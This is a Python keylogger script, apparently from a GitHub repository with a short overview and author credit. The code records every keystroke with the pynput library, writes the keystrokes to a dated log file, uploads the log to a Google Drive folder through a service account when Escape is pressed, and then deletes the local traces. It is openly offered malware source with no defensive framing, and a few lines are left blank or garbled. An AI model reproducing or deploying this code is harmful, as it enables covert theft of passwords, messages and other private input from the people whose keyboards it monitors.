# Keylogger Script

## Overview

#This Python script is a basic keylogger that captures keyboard inputs and uploads them to Google Drive. It utilizes the `pynput` library for keyboard monitoring and the Google Drive API for file uploads.

## Author

# **Adil** ([CodeWizardAdil](https://github.com/CodeWizardAdil))

import os
import shutil
#Importing Google api libraries
from googleapiclient.discovery import build
from google.oauth2 import service_account
# Importing the keyboard module from the pyinput library
from pynput import keyboard
#Importing Classes Listener & Key
from pynput.keyboard import Listener
#imprting datetime Library to set filename
from datetime import datetime

#Setting File Name Variable 
CurrentDT = datetime.now().strftime("%Y-%m-%d")
file_path_name = f"tmp/log_{CurrentDT}.txt"

#Google Drive Codes
SCOPES = ['https://www.googleapis.com/auth/drive']
SERVICE_ACCOUNT_FILE = #Add File Name Of Json Script
PARENT_FOLDER_ID = #Gdrive Parent Folder ID
def authenticate():
    creds = service_account.Credentials.from_service_account_file(SERVICE_ACCOUNT_FILE, scopes=SCOPES)
    return creds

def upload_file(file_path):
    creds = authenticate()
    service = build('drive', 'v3', credentials=creds)
    

    file_metadata = {
        'name' : f"log_{CurrentDT}.txt",
        'parents' : [PARENT_FOLDER_ID]
    }

    file = service.files().create(
        body=file_metadata,
        media_body=file_path
    ).execute()
#Ending


#Defining a fucntion that provides instruction to perfor when a key is pressed
def keyPress(key):
#Removing ' from string
    key = str(key).replace("'","")
#Replacing Key.space with spaces
    if key == 'Key.space' :
        key = ' '
    if key == 'Key.tab' :
        key = '  '"MyLogs"
#Removing Shift value
    if key == 'Key.shift_r':
        key = ''
#Removing Shift value
    if key == 'Key.backspace':
        key = ''
#Replacing Key.space with \n to break line
    if key == 'Key.enter' :
        key = '\n'
    if key == 'Key.esc' :
        the_listener.stop()
        on_exit()
#Here we are creating a txt file with filename as date and writing the keystorkes
    if not os.path.exists("tmp"):
        os.mkdir("tmp")
    with open(file_path_name, "a") as key_log:
        key_log.write(key)
def on_exit():
    upload_file(file_path_name)  
    return False
#Here We Are Using Listener Class to Call Appropriate Functions While Pressing Key
with Listener(on_press=keyPress) as the_listener:
#Blocking the main program's execution until the listener
    the_listener.join()
#Removing the temporary folder
shutil.rmtree("tmp")




